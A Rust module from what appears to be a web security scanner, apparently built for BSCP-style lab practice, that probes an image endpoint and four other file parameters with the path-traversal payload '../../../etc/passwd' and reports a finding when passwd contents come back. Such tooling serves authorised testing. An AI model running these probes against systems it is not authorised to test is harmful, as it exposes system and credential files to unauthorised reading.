//! Local File Inclusion / path traversal reconnaissance:
//! image endpoints, filename parameters, directory traversal probes.

use std::sync::Arc;

use crate::{
    output::{Finding, Severity},
    scanner::ScanContext,
};

pub async fn run(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    ctx.out.info("Checking for LFI / path traversal vectors…");

    let (img_f, param_f) = tokio::join!(check_image_endpoint(ctx), check_filename_params(ctx));

    let mut findings = Vec::new();
    findings.extend(img_f);
    findings.extend(param_f);
    findings
}

/// /image?filename= is a classic BSCP LFI endpoint.
async fn check_image_endpoint(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Confirm the endpoint exists with a benign filename
    let Ok(base_r) = ctx
        .client
        .get(ctx.url("/image"))
        .query(&[("filename", "1.jpg")])
        .send()
        .await
    else {
        return findings;
    };

    if base_r.status().is_success() {
        let f = Finding::new(
            Severity::Medium,
            "LFI / Path Traversal",
            "Image endpoint /image?filename= found — test for path traversal (../../../etc/passwd)",
        );
        ctx.out.finding(&f);
        findings.push(f);

        // Try an actual traversal
        let traversal = "../../../etc/passwd";
        let Ok(r) = ctx
            .client
            .get(ctx.url("/image"))
            .query(&[("filename", traversal)])
            .send()
            .await
        else {
            return findings;
        };

        let body = r.text().await.unwrap_or_default();
        if body.contains("root:") || body.contains("/bin/bash") || body.contains("daemon:") {
            let f = Finding::new(
                Severity::High,
                "LFI / Path Traversal",
                "Path traversal confirmed at /image?filename= — /etc/passwd readable",
            )
            .with_details(body.trim().lines().take(3).collect::<Vec<_>>().join(" | "));
            ctx.out.finding(&f);
            findings.push(f);
        }
    }
    findings
}

/// Check other common filename-based parameters across various endpoints.
async fn check_filename_params(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();

    let endpoints = [
        ("/download", "filename"),
        ("/file", "name"),
        ("/static", "file"),
        ("/assets", "path"),
    ];

    for (path, param) in endpoints {
        let Ok(r) = ctx
            .client
            .get(ctx.url(path))
            .query(&[(param, "../../../etc/passwd")])
            .send()
            .await
        else {
            continue;
        };

        let body = r.text().await.unwrap_or_default();
        if body.contains("root:") || body.contains("/bin/bash") {
            let f = Finding::new(
                Severity::High,
                "LFI / Path Traversal",
                format!("Path traversal at {path}?{param}= — /etc/passwd readable"),
            );
            ctx.out.finding(&f);
            findings.push(f);
        }
    }
    findings
}
